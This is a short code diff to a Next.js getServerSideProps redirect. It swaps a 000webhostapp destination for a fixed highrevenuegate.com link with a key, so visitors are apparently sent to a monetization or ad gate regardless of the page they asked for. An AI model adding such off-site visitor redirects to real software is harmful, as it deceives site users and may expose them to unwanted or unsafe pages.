@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://telly1news.000webhostapp.com/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/wmczbyzi5t?key=e52bd284d2e7d1af6cdc370649cbfc89/` 
 				}`,
 			},
 		};
